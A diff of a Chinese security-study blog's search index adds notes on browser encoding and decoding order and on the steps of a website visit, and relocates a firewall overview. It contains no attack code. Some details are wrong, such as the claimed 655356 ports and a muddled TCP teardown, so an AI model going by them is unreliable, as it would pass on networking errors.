+    <content><![CDATA[<h1 id="浏览器编码与解码"><a href="#浏览器编码与解码" class="headerlink" title="浏览器编码与解码"></a>浏览器编码与解码</h1><h1 id="访问网站过程中涉及的编解码"><a href="#访问网站过程中涉及的编解码" class="headerlink" title="访问网站过程中涉及的编解码"></a>访问网站过程中涉及的编解码</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>在url中如果在参数部分出现&#x2F;等特殊字符，会导致浏览器对资源路径的错误判断，为了解决这个问题，引入了url编码这一概念，它是以%加字符的ascii码对应的二位十六进制数如 ‘&#x3D;%23 space&#x3D;%20 </p>
+<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>在html中有一些字符是需要预留的，如&lt; &amp; 等，如果用户输入这些字符后被直接输出到html中，则可能导致浏览器在创建dom树的时候错误的识别标签的开始，从而导致错误。于是引入了html编码，有两种类型，被称为HTML编码与HTML编号。如&lt;可以被表示为：&lt;,&#60;,&#x3c;</p>
+<p><code>注意：</code>&amp;开头 ;结尾</p>
+<p>JS编码</p>
+<p>js编码采用unicode字符集，四个字节表示一个字符</p>
+<p>js常见的反斜杠方式编码处理</p>
+<ul>
+<li>\b退格符，\t制表符，\v垂直制表符等；</li>
+<li>三位数字，不足位数用0补充，按8位原字符八进制字符编码；</li>
+<li>两位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x</li>
+<li>四位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u 。</li>
+</ul>
+<p>如\145、\x65和\u0065都代表字符e。</p>
+<h1 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h1><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>url解码过程较为简单，服务器对接收到用户传输过来的URL进行解析，遇到%便自动进行解码。</p>
+<h2 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h2><p>HTML解析器其实是一个状态机，在对HTML资源从上而下进行解析时遇到一个‘&lt;‘符号就会进入标签开始状态（Tag Open State），然后搜寻标签，img可以被识别为正确的标签，img1则不会识别，最后在读到最近的一个‘&gt;’时，结束标签状态进入数据状态（Data State）。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //无效代码</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //有效代码</span><br></pre></td></tr></table></figure>
+
+<p>上例中，第一条不会被正常解析，第二条会被正常解析，由此可将<code>html实体编码的解码是发生在DOM树构建完成后才进行的</code>，<code>故html实体编码只能出现在数据区域，不能出现在标签开始状态与结束状态，这两种状态都不会被成功解码</code>。这很重要</p>
+<h2 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h2><p>得到一个html文档后，浏览器顺序构造dom树与cssom树，当遇到一个<script>标签后，dom构建被阻塞，等待js文件被加载完毕，执行完毕，之后继续构建dom树</p>
+<p><strong>为什么现在的js代码被放在最后面？</strong></p>
+<p>因为js代码会修改并阻塞dom的渲染，若js代码放在header中则在js执行完毕之前 ，浏览器窗口会显示一片空白，用户体验差，将js代码放在最后，能提供更好的用户体验</p>
+<p>js的脚本处理模型是按照源码处理-函数解析-代码执行这个执行流来的，重点是，先解码再执行，故可对js代码中的任意内容进行编码，js都能被成功执行。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>编解码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器访问网站过程</title>
+    <url>/archives/41b7ef22.html</url>
+    <content><![CDATA[<h1 id="浏览器访问网站过程"><a href="#浏览器访问网站过程" class="headerlink" title="浏览器访问网站过程"></a>浏览器访问网站过程</h1><h1 id="QUESTION1：浏览器访问网站的过程"><a href="#QUESTION1：浏览器访问网站的过程" class="headerlink" title="QUESTION1：浏览器访问网站的过程"></a>QUESTION1：浏览器访问网站的过程</h1><h2 id="step1：缓存查找"><a href="#step1：缓存查找" class="headerlink" title="step1：缓存查找"></a>step1：缓存查找</h2><p>如果改页面在短时间内被访问过，则会经过缓存茶盏来判断是否需要请求新的资源，根据max-age、expires、cache-control、if-none-match、last-modifiled、etoken等来判断是走浏览器缓存还是向服务器请求数据，走浏览器缓存则直接返回数据，响应状态设置为灰色的200。</p>
+<h2 id="step1：域名解析"><a href="#step1：域名解析" class="headerlink" title="step1：域名解析"></a>step1：域名解析</h2><hr>
+<p>首先浏览器需要做域名解析，在浏览器本地的缓存中寻找是否又该域名的解析，如果没有，则到主机的缓存中去寻找，如果也没有，就到主机的hosts文件中去寻找，如果仍然没有则到路由器中找，如果还没有则根据指定的本地dns地址到指定的本地域名服务器上去寻找，如果没有寻找到，则到缓存中去找，如果也没有且如果配置了转发的话，则会把这个请求转发到该域名服务器的上一级域名服务器解析，上一级域名服务器如果也没有寻找到要么再到上一级或者到根服务器去寻找，这个过程叫做<code>递归查询</code>。根服务器告知主机负责解析顶级域名的服务器的地址，顶级域名服务器告知负责二级域名解析的服务器的地址，二级域名解析服务器告知三级域名解析的服务器的地址，依次迭代，直到找到该域名的解析为止，这个过程叫做<code>迭代查询</code>。</p>
+<h2 id="step2：建立tcp连接"><a href="#step2：建立tcp连接" class="headerlink" title="step2：建立tcp连接"></a>step2：建立tcp连接</h2><hr>
+<p>域名解析完成后，开始建立tcp连接，连接时进行三次握手，首先客户端发送syn报文，将标志位syn设为1，同步序列号设为x,进入syn_send状态，服务器收到请求后回一个ack报文，其中标志位syn设为1，ack标志位设为1，同步序列号设为y,确认号设为x+1，进入syn_recieve状态，客户端收到确认报文之后，发送确认报文到服务器，ack标志位设为1，确认号设为y+1,进入established状态，此时tcp连接建立完毕。</p>
+<h2 id="step3：发送请求"><a href="#step3：发送请求" class="headerlink" title="step3：发送请求"></a>step3：发送请求</h2><hr>
+<p>tcp连接建立后开始开始传送http协议数据内容，经过tcp&#x2F;ip协议五层层层封装，数据首先在五层编码成二进制，再到4层经过tcp层加上5层协议的端口号，根据数据链路层MTU对数据进行分段，然后到3层加上ip地址与4层协议号，然后数据到了三层后，首先判断目标ip地址是不是与本机处在同一网段，如果是在同一网段，则查询arp缓存表，或者进行arp广播，如果没有在同一网段则根据本机配置的网关地址，查询arp缓存表或者广播查询网关的mac地址，完成后封装帧头帧尾，然后数据被发送网关，由网关进行地址转换，然后层层路由到服务器端。</p>
+<h2 id="step4：服务器解析请求，发送数据"><a href="#step4：服务器解析请求，发送数据" class="headerlink" title="step4：服务器解析请求，发送数据"></a>step4：服务器解析请求，发送数据</h2><hr>
+<p>服务器根据请求内容返回相应内容，如果请求的是静态网页，将直接由web中间件根据url中请求的内容返回对应的数据，如果请求的是动态的页面，则web中间件将请求通过socket发送到动态脚本解析器解析执行，解析器若发现需要查询数据库，则会连接数据库进行查询并将数据添加到结果中，脚本解析器解析完后，将数据发回给web中间件，web中间件再发回给浏览器。</p>
+<h2 id="step5：断开连接"><a href="#step5：断开连接" class="headerlink" title="step5：断开连接"></a>step5：断开连接</h2><hr>
+<p>当浏览器没有要发送的数据时，服务器首先发送一个结束报文，我们称其为执行主动关闭，该报文中fin标志位设置为1，ack标志位设置位1，syn标志位设置位0，同步序列号为x,确认号设置为z,此时服务器关闭其发送数据服务，但仍然可以接受来自浏览器的数据，浏览器接收到后回复服务器一个ack报文，表示已经接收到了服务器的结束连接请求，设置ack标志位为1，syn标志位位0，fin标志位为0，同步序列号为z,此时如果浏览器仍然有请求，仍然可以发送给服务器，等到浏览器没有请求发送后，其会发送一个带有fin+ack标志位的包给服务器，并设置确认号位X，同步序列号位Y表示没有数据再发送给服务器了，进入lask_ack状态，当服务器收到该报文后，发送一个带有ack标记的包给浏览器，同步序列号设置为X，此时服务其进入最终确认状态fn_ack ,待等待了2msl(2倍报文最大生存时间)后，服务器释放连接。</p>
+<h2 id="step6：浏览器解析、渲染数据"><a href="#step6：浏览器解析、渲染数据" class="headerlink" title="step6：浏览器解析、渲染数据"></a>step6：浏览器解析、渲染数据</h2><hr>
+<p>客户端收到数据后，经过层层的解封装、重组等操作最终将数据发送到浏览器。浏览器接受到数据后首先将html代码构造成DOM树，css文件构造成CSSOM,这两个过程是同步进行，然后浏览器合并这两棵树，生成渲染树，最后进行重构，渲染等操作得到我们看到的网页</p>
+<h1 id="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"><a href="#QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？" class="headerlink" title="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"></a>QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？</h1><p><strong>共有655356个端口</strong></p>
+<ol>
+<li>0-1023 公认端口，一般都有特殊的含义，个人在分配端口的时候一般不使用这些端口</li>
+<li>1024-49151 注册端口：这些端口可以用于绑定一些服务</li>
+<li>49152-65535 私有端口：这些端口我们在测试的过程中可以使用</li>
+</ol>
+<h1 id="QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？"><a href="#QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？" class="headerlink" title="QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？"></a>QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？</h1><p>一般用作测试用，可以用于测试本机的网络配置是否成功，可以用于本机应用间的通信</p>
+<h1 id="QUESTION3：部署网站的体会"><a href="#QUESTION3：部署网站的体会" class="headerlink" title="QUESTION3：部署网站的体会"></a>QUESTION3：部署网站的体会</h1><p>我在部署过程中遇到的一个问题就是PHP版本不匹配的问题，我使用的PHP版本时7.3，这个版本的PHP与老的版本的PHP有较大的差别，就我所知道的，7.3版本里面单条mysql单条查询语句的执行函数时mysqli_query(),而老版本的PHP中确是mysql_qurey，所以我在发布网站之后，访问页面是一片空白。这个问题我在部署sqli_labs的时候也遇到过，不过当时有报错信息，所以我很快就找到了问题的根源，但这次却没有报错信息，所以浪费了很多的时间，还向刘俊岑请教了一下，我方才大彻大悟，可能是PHP版本不兼容导致的， 在我使用了低版本的PHP后，这个问题果然被解决了。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
       </tags>
   </entry>
   <entry>
@@ -5648,68 +5648,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>Web</tag>
         <tag>前端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>防火墙</title>
-    <url>/archives/9c75190f.html</url>
-    <content><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙一般不能防止病毒，只负责过滤流量，一般普遍的是二三四层的防火墙，基于ip\端口号等进行流量过滤，能有效防火ddos攻击。防火墙兼具路由、vpn等功能</p>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a><strong>类型</strong></h2><ol>
-<li>代理防火墙<ol>
-<li>防火墙作为一个代理，内网流量到达防火墙之后，防火墙回复源主机，目标已到达，并同时修改源ip地址对数据包进行代理转发。整个是透明的</li>
-</ol>
-</li>
-<li>状态检测防火墙<ol>
-<li>当内网流量到达后，防火墙检查状态信息，发现没有匹配的状态，于是检查策略，发现该流量是允许通过的，于是记录源ip目标ipP源端口号目标端口号保存作为一条状态消息，然后检查路由表、nat地址池等记录关键信息作为状态，然后将流量进行放行。</li>
-<li>当流量回来后，防火墙首先进行状态匹配，若成功则通过该状态中存储的信息对数据进行装法，而不必在检查策略、检查路由表等操作。</li>
-</ol>
-</li>
-<li>DPI 深度包检测技术</li>
-<li>IPS 入侵防御系统 -应用层防火墙<ol>
-<li>检测并处理</li>
-<li>通过特征库来对流量进行过滤</li>
-</ol>
-</li>
-<li>IDS 入侵检测系统 -应用层防火墙<ol>
-<li>只做检测，不做处理，通常使用旁路安装，将经的流量复制一份进行检测，是透明的。</li>
-<li>通过特征库来对流量进行过滤</li>
-</ol>
-</li>
-<li>waf web应用防火墙<ol>
-<li>只针对web应用进行检测</li>
-</ol>
-</li>
-<li>用户行为防火墙<ol>
-<li>检查当前用户的上网行为，对用户上网行为进行监控，控制用户的访问情况，包括能访问那些网站，能使用那些应用，不能使用那些应用等。</li>
-</ol>
-</li>
-</ol>
-<h2 id="衡量指标"><a href="#衡量指标" class="headerlink" title="衡量指标"></a><strong>衡量指标</strong></h2><ol>
-<li>吞吐量</li>
-<li>时延</li>
-<li>丢包率</li>
-<li>并发连接数：能同时处理的会话</li>
-<li>新建连接数：单位时间内能同时新建的连接数</li>
-</ol>
-<h2 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a><strong>应用模式</strong></h2><ol>
-<li>透明模式：防火墙端口工作在二层端口，对整个网络来说是透明的，三个区域工作在同一个网段</li>
-<li>路由模式：防火墙端口工作在三层端口，可配置nat\路由\vpn等，三个区域工作在不同的网段</li>
-<li>混杂模式：连接外网的端口工作在三层，另外两个区域的端口工作在二层。也可以让外部区域与DMZ区域的几口工作在三层，DMZ区域使用公网IP，内部区域接口工作在二层。</li>
-</ol>
-<h2 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a><strong>区域隔离</strong></h2><p>一般划分为三个区域，用来配置策略</p>
-<ol>
-<li>DMZ	非军事化区 ，当有网站需要对外发布的时候设置该区域，该区域一般不配置向内网的策略，也就是不能访问内网，用以保证内网的安全。</li>
-<li>内部区域</li>
-<li>外部区域</li>
-</ol>
-<h2 id="HA技术-双机热备"><a href="#HA技术-双机热备" class="headerlink" title="HA技术-双机热备"></a>HA技术-双机热备</h2><p>两台防火墙，一台为主防火墙，一台为备份防火墙，两台防火墙通过心跳线连接起来，互相交换状态信息，防火墙数据。两台防火墙同一侧的ip地址一样，心跳线两头的ip地址不一样。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>安全设备</category>
-      </categories>
-      <tags>
-        <tag>防火墙</tag>
       </tags>
   </entry>
   <entry>
@@ -6174,6 +6112,68 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>面试题</tag>
         <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>防火墙</title>
+    <url>/archives/9c75190f.html</url>
+    <content><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙一般不能防止病毒，只负责过滤流量，一般普遍的是二三四层的防火墙，基于ip\端口号等进行流量过滤，能有效防火ddos攻击。防火墙兼具路由、vpn等功能</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a><strong>类型</strong></h2><ol>
+<li>代理防火墙<ol>
+<li>防火墙作为一个代理，内网流量到达防火墙之后，防火墙回复源主机，目标已到达，并同时修改源ip地址对数据包进行代理转发。整个是透明的</li>
+</ol>
+</li>
+<li>状态检测防火墙<ol>
+<li>当内网流量到达后，防火墙检查状态信息，发现没有匹配的状态，于是检查策略，发现该流量是允许通过的，于是记录源ip目标ipP源端口号目标端口号保存作为一条状态消息，然后检查路由表、nat地址池等记录关键信息作为状态，然后将流量进行放行。</li>
+<li>当流量回来后，防火墙首先进行状态匹配，若成功则通过该状态中存储的信息对数据进行装法，而不必在检查策略、检查路由表等操作。</li>
+</ol>
+</li>
+<li>DPI 深度包检测技术</li>
+<li>IPS 入侵防御系统 -应用层防火墙<ol>
+<li>检测并处理</li>
+<li>通过特征库来对流量进行过滤</li>
+</ol>
+</li>
+<li>IDS 入侵检测系统 -应用层防火墙<ol>
+<li>只做检测，不做处理，通常使用旁路安装，将经的流量复制一份进行检测，是透明的。</li>
+<li>通过特征库来对流量进行过滤</li>
+</ol>
+</li>
+<li>waf web应用防火墙<ol>
+<li>只针对web应用进行检测</li>
+</ol>
+</li>
+<li>用户行为防火墙<ol>
+<li>检查当前用户的上网行为，对用户上网行为进行监控，控制用户的访问情况，包括能访问那些网站，能使用那些应用，不能使用那些应用等。</li>
+</ol>
+</li>
+</ol>
+<h2 id="衡量指标"><a href="#衡量指标" class="headerlink" title="衡量指标"></a><strong>衡量指标</strong></h2><ol>
+<li>吞吐量</li>
+<li>时延</li>
+<li>丢包率</li>
+<li>并发连接数：能同时处理的会话</li>
+<li>新建连接数：单位时间内能同时新建的连接数</li>
+</ol>
+<h2 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a><strong>应用模式</strong></h2><ol>
+<li>透明模式：防火墙端口工作在二层端口，对整个网络来说是透明的，三个区域工作在同一个网段</li>
+<li>路由模式：防火墙端口工作在三层端口，可配置nat\路由\vpn等，三个区域工作在不同的网段</li>
+<li>混杂模式：连接外网的端口工作在三层，另外两个区域的端口工作在二层。也可以让外部区域与DMZ区域的几口工作在三层，DMZ区域使用公网IP，内部区域接口工作在二层。</li>
+</ol>
+<h2 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a><strong>区域隔离</strong></h2><p>一般划分为三个区域，用来配置策略</p>
+<ol>
+<li>DMZ	非军事化区 ，当有网站需要对外发布的时候设置该区域，该区域一般不配置向内网的策略，也就是不能访问内网，用以保证内网的安全。</li>
+<li>内部区域</li>
+<li>外部区域</li>
+</ol>
+<h2 id="HA技术-双机热备"><a href="#HA技术-双机热备" class="headerlink" title="HA技术-双机热备"></a>HA技术-双机热备</h2><p>两台防火墙，一台为主防火墙，一台为备份防火墙，两台防火墙通过心跳线连接起来，互相交换状态信息，防火墙数据。两台防火墙同一侧的ip地址一样，心跳线两头的ip地址不一样。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>安全设备</category>
+      </categories>
+      <tags>
+        <tag>防火墙</tag>
       </tags>
   </entry>
   <entry>
@@ -6697,10 +6697,10 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <category>安全技术</category>
       </categories>
       <tags>
+        <tag>认证绕过</tag>
         <tag>网络安全</tag>
         <tag>漏洞分析</tag>
         <tag>漏洞</tag>
-        <tag>认证绕过</tag>
         <tag>WebFlux Security</tag>
         <tag>CVE-2023-34034</tag>
       </tags>
